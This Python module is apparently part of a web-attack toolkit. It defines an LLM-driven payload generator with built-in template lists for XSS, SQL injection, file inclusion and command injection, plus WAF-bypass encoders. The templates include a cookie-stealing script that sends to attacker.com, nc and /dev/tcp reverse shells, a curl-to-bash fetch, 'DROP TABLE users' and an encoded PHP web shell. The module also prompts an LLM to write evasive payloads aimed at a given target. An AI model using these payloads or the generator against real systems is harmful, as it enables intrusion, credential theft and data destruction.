"""
AI-Powered Payload Generator

This module provides intelligent payload generation capabilities using AI/LLM
to create custom, context-aware payloads for web application security testing.
"""

import asyncio
import json
import re
import random
import string
from typing import Dict, List, Any, Optional, Union, Tuple
from dataclasses import dataclass
from enum import Enum
import logging
from urllib.parse import urlparse, parse_qs

from app.core.config import settings
from app.llm.llm_client import LLMClient
from app.security.payload_generator import PayloadGenerator

logger = logging.getLogger(__name__)


class PayloadContext(Enum):
    """Context for payload generation"""
    URL_PARAMETER = "url_parameter"
    FORM_FIELD = "form_field"
    JSON_BODY = "json_body"
    XML_BODY = "xml_body"
    HEADER = "header"
    COOKIE = "cookie"
    FILE_UPLOAD = "file_upload"
    API_ENDPOINT = "api_endpoint"


class TargetAnalysis(Enum):
    """Target analysis types"""
    TECHNOLOGY_STACK = "technology_stack"
    WAF_DETECTION = "waf_detection"
    INPUT_VALIDATION = "input_validation"
    ENCODING_SCHEMES = "encoding_schemes"
    FRAMEWORK_DETECTION = "framework_detection"


@dataclass
class PayloadRequest:
    """Request for payload generation"""
    target_url: str
    vulnerability_type: str
    context: PayloadContext
    input_field: Optional[str] = None
    current_value: Optional[str] = None
    target_analysis: Optional[Dict[str, Any]] = None
    custom_requirements: Optional[str] = None
    difficulty_level: str = "medium"
    bypass_techniques: Optional[List[str]] = None


@dataclass
class GeneratedPayload:
    """Generated payload with metadata"""
    payload: str
    description: str
    technique: str
    success_probability: float
    bypass_methods: List[str]
    verification_steps: List[str]
    risk_level: str
    mitigation: str
    ai_reasoning: str


class AIPayloadGenerator:
    """AI-powered payload generator with intelligent customization"""
    
    def __init__(self):
        self.llm_client = LLMClient()
        self.base_payload_generator = PayloadGenerator()
        self.payload_templates = self._load_payload_templates()
        self.bypass_techniques = self._load_bypass_techniques()
        self.encoding_methods = self._load_encoding_methods()
        
    def _load_payload_templates(self) -> Dict[str, List[str]]:
        """Load payload templates for different contexts"""
        return {
            "xss": {
                "basic": [
                    "<script>alert('XSS')</script>",
                    "<img src=x onerror=alert('XSS')>",
                    "javascript:alert('XSS')",
                    "<svg onload=alert('XSS')>",
                    "<iframe src=javascript:alert('XSS')>"
                ],
                "advanced": [
                    "<script>fetch('http://attacker.com?cookie='+document.cookie)</script>",
                    "<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>",
                    "<script>new Function('alert(\\'XSS\\')')()</script>"
                ],
                "bypass": [
                    "<ScRiPt>alert('XSS')</ScRiPt>",
                    "<script>alert(String.fromCharCode(88,83,83))</script>",
                    "<script>alert('XSS'.replace(/./g, c => String.fromCharCode(c.charCodeAt(0) + 1)))</script>"
                ]
            },
            "sqli": {
                "basic": [
                    "' OR 1=1--",
                    "' UNION SELECT NULL--",
                    "'; DROP TABLE users--",
                    "' OR '1'='1",
                    "admin'--"
                ],
                "advanced": [
                    "' UNION SELECT username,password FROM users--",
                    "' AND (SELECT COUNT(*) FROM users)>0--",
                    "' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)='a'--"
                ],
                "bypass": [
                    "'/**/OR/**/1=1--",
                    "'%20OR%201=1--",
                    "'+OR+1=1--"
                ]
            },
            "lfi": {
                "basic": [
                    "../../../etc/passwd",
                    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                    "/etc/passwd",
                    "C:\\windows\\system32\\drivers\\etc\\hosts"
                ],
                "advanced": [
                    "php://filter/convert.base64-encode/resource=index.php",
                    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOz8+",
                    "expect://id"
                ],
                "bypass": [
                    "..%2F..%2F..%2Fetc%2Fpasswd",
                    "..%252F..%252F..%252Fetc%252Fpasswd",
                    "....//....//....//etc/passwd"
                ]
            },
            "rce": {
                "basic": [
                    "; ls -la",
                    "| whoami",
                    "`id`",
                    "$(whoami)",
                    "& dir"
                ],
                "advanced": [
                    "; nc -e /bin/sh attacker.com 4444",
                    "| bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'",
                    "`curl http://attacker.com/shell.sh | bash`"
                ],
                "bypass": [
                    "%3B%20ls%20-la",
                    "%7C%20whoami",
                    "`id`"
                ]
            }
        }
    
    def _load_bypass_techniques(self) -> Dict[str, List[str]]:
        """Load WAF bypass techniques"""
        return {
            "encoding": [
                "URL encoding",
                "HTML encoding",
                "Hex encoding",
                "Unicode encoding",
                "Base64 encoding",
                "Double encoding"
            ],
            "case_manipulation": [
                "Mixed case",
                "Case alternation",
                "Case inversion"
            ],
            "whitespace": [
                "Tab characters",
                "Newline characters",
                "Carriage return",
                "Multiple spaces"
            ],
            "comment_injection": [
                "SQL comments",
                "HTML comments",
                "JavaScript comments"
            ],
            "null_byte": [
                "Null byte injection",
                "Null character bypass"
            ]
        }
    
    def _load_encoding_methods(self) -> Dict[str, callable]:
        """Load encoding methods"""
        return {
            "url": lambda x: x.replace('<', '%3C').replace('>', '%3E').replace('"', '%22').replace("'", '%27'),
            "html": lambda x: x.replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;').replace("'", '&#39;'),
            "hex": lambda x: ''.join([hex(ord(c))[2:] for c in x]),
            "unicode": lambda x: ''.join([f'%u00{ord(c):02x}' for c in x]),
            "base64": lambda x: __import__('base64').b64encode(x.encode()).decode(),
            "double_url": lambda x: x.replace('<', '%253C').replace('>', '%253E').replace('"', '%2522').replace("'", '%2527')
        }
    
    async def analyze_target(self, target_url: str) -> Dict[str, Any]:
        """Analyze target for intelligent payload generation"""
        analysis = {
            "technology_stack": {},
            "waf_detected": False,
            "input_validation": {},
            "encoding_schemes": [],
            "framework_detection": {}
        }
        
        try:
            # Basic target analysis
            parsed_url = urlparse(target_url)
            analysis["domain"] = parsed_url.netloc
            analysis["path"] = parsed_url.path
            analysis["parameters"] = parse_qs(parsed_url.query)
            
            # Technology detection based on URL patterns
            if "php" in target_url.lower() or ".php" in parsed_url.path:
                analysis["technology_stack"]["language"] = "PHP"
            elif "asp" in target_url.lower() or ".asp" in parsed_url.path:
                analysis["technology_stack"]["language"] = "ASP"
            elif "jsp" in target_url.lower() or ".jsp" in parsed_url.path:
                analysis["technology_stack"]["language"] = "JSP"
            elif "aspx" in target_url.lower() or ".aspx" in parsed_url.path:
                analysis["technology_stack"]["language"] = "ASP.NET"
            
            # Framework detection
            if "laravel" in target_url.lower():
                analysis["framework_detection"]["name"] = "Laravel"
            elif "django" in target_url.lower():
                analysis["framework_detection"]["name"] = "Django"
            elif "spring" in target_url.lower():
                analysis["framework_detection"]["name"] = "Spring"
            
            # WAF detection hints
            if "cloudflare" in target_url.lower():
                analysis["waf_detected"] = True
                analysis["waf_type"] = "Cloudflare"
            
            logger.info(f"Target analysis completed for {target_url}")
            
        except Exception as e:
            logger.error(f"Error analyzing target: {e}")
        
        return analysis
    
    async def generate_intelligent_payload(self, request: PayloadRequest) -> List[GeneratedPayload]:
        """Generate intelligent payloads using AI analysis"""
        try:
            # Analyze target if not provided
            if not request.target_analysis:
                request.target_analysis = await self.analyze_target(request.target_url)
            
            # Generate base payloads
            base_payloads = self.base_payload_generator.generate_payloads(
                request.vulnerability_type, 
                request.difficulty_level, 
                count=5
            )
            
            # Create AI prompt for payload customization
            ai_prompt = self._create_ai_prompt(request, base_payloads)
            
            # Get AI-generated payloads
            ai_response = await self.llm_client.generate_response(ai_prompt)
            
            # Parse AI response and create payloads
            generated_payloads = self._parse_ai_response(ai_response, request)
            
            # Add base payloads as fallback
            for base_payload in base_payloads:
                generated_payload = GeneratedPayload(
                    payload=base_payload["payload"],
                    description=base_payload["description"],
                    technique="Standard",
                    success_probability=0.6,
                    bypass_methods=["Standard"],
                    verification_steps=self.base_payload_generator.get_verification_steps(request.vulnerability_type),
                    risk_level="Medium",
                    mitigation="Standard input validation",
                    ai_reasoning="Standard payload from database"
                )
                generated_payloads.append(generated_payload)
            
            logger.info(f"Generated {len(generated_payloads)} intelligent payloads")
            return generated_payloads
            
        except Exception as e:
            logger.error(f"Error generating intelligent payloads: {e}")
            # Fallback to base payloads
            base_payloads = self.base_payload_generator.generate_payloads(
                request.vulnerability_type, 
                request.difficulty_level, 
                count=3
            )
            return [GeneratedPayload(
                payload=p["payload"],
                description=p["description"],
                technique="Fallback",
                success_probability=0.5,
                bypass_methods=["Standard"],
                verification_steps=self.base_payload_generator.get_verification_steps(request.vulnerability_type),
                risk_level="Medium",
                mitigation="Standard input validation",
                ai_reasoning="Fallback payload due to AI error"
            ) for p in base_payloads]
    
    def _create_ai_prompt(self, request: PayloadRequest, base_payloads: List[Dict[str, Any]]) -> str:
        """Create AI prompt for payload generation"""
        prompt = f"""
You are an expert web application security tester. Generate intelligent, context-aware payloads for the following scenario:

TARGET ANALYSIS:
- URL: {request.target_url}
- Technology Stack: {request.target_analysis.get('technology_stack', {})}
- WAF Detected: {request.target_analysis.get('waf_detected', False)}
- Framework: {request.target_analysis.get('framework_detection', {})}

PAYLOAD REQUEST:
- Vulnerability Type: {request.vulnerability_type}
- Context: {request.context.value}
- Input Field: {request.input_field or 'Unknown'}
- Current Value: {request.current_value or 'None'}
- Difficulty Level: {request.difficulty_level}
- Custom Requirements: {request.custom_requirements or 'None'}

BASE PAYLOADS (for reference):
{json.dumps(base_payloads, indent=2)}

TASK:
Generate 3-5 intelligent payloads that are:
1. Context-aware for the target technology
2. Designed to bypass potential WAF/input validation
3. Appropriate for the specified difficulty level
4. Customized for the input context

For each payload, provide:
- The actual payload
- Technique used
- Success probability (0.0-1.0)
- Bypass methods
- Verification steps
- Risk level (Low/Medium/High)
- Mitigation recommendations
- AI reasoning for the payload choice

Format your response as JSON:
{{
    "payloads": [
        {{
            "payload": "actual_payload_here",
            "technique": "technique_description",
            "success_probability": 0.8,
            "bypass_methods": ["method1", "method2"],
            "verification_steps": ["step1", "step2"],
            "risk_level": "High",
            "mitigation": "mitigation_description",
            "ai_reasoning": "why this payload was chosen"
        }}
    ]
}}

Focus on creating payloads that are likely to succeed against the specific target and context.
"""
        return prompt
    
    def _parse_ai_response(self, ai_response: str, request: PayloadRequest) -> List[GeneratedPayload]:
        """Parse AI response and convert to GeneratedPayload objects"""
        generated_payloads = []
        
        try:
            # Extract JSON from AI response
            json_match = re.search(r'\{.*\}', ai_response, re.DOTALL)
            if json_match:
                response_data = json.loads(json_match.group())
                
                for payload_data in response_data.get("payloads", []):
                    generated_payload = GeneratedPayload(
                        payload=payload_data.get("payload", ""),
                        description=f"AI-generated {request.vulnerability_type} payload",
                        technique=payload_data.get("technique", "AI Generated"),
                        success_probability=payload_data.get("success_probability", 0.5),
                        bypass_methods=payload_data.get("bypass_methods", []),
                        verification_steps=payload_data.get("verification_steps", []),
                        risk_level=payload_data.get("risk_level", "Medium"),
                        mitigation=payload_data.get("mitigation", "Standard mitigation"),
                        ai_reasoning=payload_data.get("ai_reasoning", "AI-generated payload")
                    )
                    generated_payloads.append(generated_payload)
            
        except Exception as e:
            logger.error(f"Error parsing AI response: {e}")
        
        return generated_payloads
    
    async def generate_contextual_payloads(self, target_url: str, context: str, 
                                         vulnerability_type: str = "xss") -> List[GeneratedPayload]:
        """Generate payloads based on specific context"""
        try:
            # Analyze the context
            context_analysis = await self._analyze_context(target_url, context)
            
            # Create payload request
            request = PayloadRequest(
                target_url=target_url,
                vulnerability_type=vulnerability_type,
                context=PayloadContext(context),
                target_analysis=context_analysis,
                custom_requirements=f"Optimized for {context} context"
            )
            
            # Generate payloads
            return await self.generate_intelligent_payload(request)
            
        except Exception as e:
            logger.error(f"Error generating contextual payloads: {e}")
            return []
    
    async def _analyze_context(self, target_url: str, context: str) -> Dict[str, Any]:
        """Analyze specific context for payload generation"""
        analysis = await self.analyze_target(target_url)
        
        # Add context-specific analysis
        if "login" in context.lower():
            analysis["context_type"] = "authentication"
            analysis["input_fields"] = ["username", "password", "email"]
        elif "search" in context.lower():
            analysis["context_type"] = "search"
            analysis["input_fields"] = ["q", "query", "search"]
        elif "upload" in context.lower():
            analysis["context_type"] = "file_upload"
            analysis["input_fields"] = ["file", "upload", "attachment"]
        elif "api" in context.lower():
            analysis["context_type"] = "api"
            analysis["input_fields"] = ["json", "xml", "data"]
        
        return analysis
    
    def generate_bypass_payloads(self, original_payload: str, 
                                bypass_techniques: List[str]) -> List[str]:
        """Generate bypass variations of a payload"""
        bypass_payloads = []
        
        for technique in bypass_techniques:
            if technique == "encoding":
                for encoding_name, encoding_func in self.encoding_methods.items():
                    try:
                        bypassed = encoding_func(original_payload)
                        bypass_payloads.append(bypassed)
                    except Exception as e:
                        logger.error(f"Error applying {encoding_name} encoding: {e}")
            
            elif technique == "case_manipulation":
                # Mixed case
                bypass_payloads.append(''.join(c.upper() if i % 2 == 0 else c.lower() 
                                             for i, c in enumerate(original_payload)))
                # Case alternation
                bypass_payloads.append(original_payload.swapcase())
            
            elif technique == "whitespace":
                # Add various whitespace characters
                bypass_payloads.append(original_payload.replace(' ', '\t'))
                bypass_payloads.append(original_payload.replace(' ', '\n'))
                bypass_payloads.append(original_payload.replace(' ', '\r'))
            
            elif technique == "comment_injection":
                if "script" in original_payload.lower():
                    # HTML comment injection
                    bypass_payloads.append(original_payload.replace('<script>', '<script><!--'))
                    bypass_payloads.append(original_payload.replace('</script>', '--></script>'))
        
        return list(set(bypass_payloads))  # Remove duplicates
    
    async def generate_chain_payloads(self, target_url: str, 
                                    vulnerability_chain: List[str]) -> Dict[str, List[GeneratedPayload]]:
        """Generate payloads for vulnerability chains"""
        chain_payloads = {}
        
        for vuln_type in vulnerability_chain:
            request = PayloadRequest(
                target_url=target_url,
                vulnerability_type=vuln_type,
                context=PayloadContext.URL_PARAMETER,
                custom_requirements=f"Part of vulnerability chain: {' -> '.join(vulnerability_chain)}"
            )
            
            chain_payloads[vuln_type] = await self.generate_intelligent_payload(request)
        
        return chain_payloads
    
    def get_payload_statistics(self) -> Dict[str, Any]:
        """Get statistics about payload generation"""
        stats = {
            "total_payloads": 0,
            "vulnerability_types": {},
            "difficulty_distribution": {},
            "bypass_techniques": {},
            "success_rates": {}
        }
        
        # Count base payloads
        for vuln_type, payloads in self.base_payload_generator.payloads.items():
            stats["total_payloads"] += len(payloads)
            stats["vulnerability_types"][vuln_type.value] = len(payloads)
            
            for payload in payloads:
                difficulty = payload.get("difficulty", "unknown")
                stats["difficulty_distribution"][difficulty] = stats["difficulty_distribution"].get(difficulty, 0) + 1
        
        return stats
